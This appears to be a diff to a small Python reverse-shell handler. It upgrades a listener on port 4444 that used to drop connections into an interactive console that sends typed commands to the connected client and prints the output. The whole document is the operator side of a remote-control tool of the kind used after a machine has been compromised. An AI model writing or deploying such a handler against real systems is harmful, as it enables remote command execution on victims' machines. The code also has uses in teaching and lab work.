@@ -1,5 +1,5 @@
 #!/usr/bin/python
-# General - just to a connection then, immediately terminates it. Testing on port 4444
+# General - Connection to the client, able to send and recieve data. Testing on port 4444
 
 
 import socket
@@ -10,5 +10,15 @@ listr.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 listr.bind(("", 4444))
 listr.listen(0)
 print("\n[+] Waiting for incoming connection.\n")
-listr.accept()
-print("[+] Got a connection.\n")
+conn, addrs = listr.accept()
+print("[+] Got a connection from " + str(addrs) + "\n")
+
+while True:
+    comm = input('=[ $ ')
+    if "exit" in comm:
+        break
+    conn.send(comm.encode())
+    rslt = conn.recv(1024)
+    print(rslt.decode())
+
+conn.close()
